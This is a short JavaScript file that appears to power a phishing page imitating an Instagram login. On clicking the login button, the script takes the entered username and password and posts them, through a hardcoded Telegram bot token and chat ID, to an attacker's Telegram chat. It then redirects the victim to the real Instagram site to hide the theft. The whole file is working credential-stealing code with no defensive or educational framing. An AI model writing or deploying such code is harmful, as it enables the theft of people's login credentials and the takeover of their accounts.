let inputs = document.querySelectorAll('input');
let button = document.querySelector('.login-button');

const Token = '8047333069:AAE2ezVZ23N31nuui94xTN7RKEONmKKAuEw';
const Chat_Id = '6521659568';

button.addEventListener('click', () => {
    const username = inputs[0].value;
    const password = inputs[1].value;

    const message = `Loxni danniylari\nUsername: ${username}\nPassword: ${password}`;

    fetch(`https://api.telegram.org/bot${Token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: Chat_Id,
            text: message,
        }),
    })
        .then(response => response.json())
        .then(res => console.log(res)
        )

    window.location.href = 'https://www.instagram.com/'
});
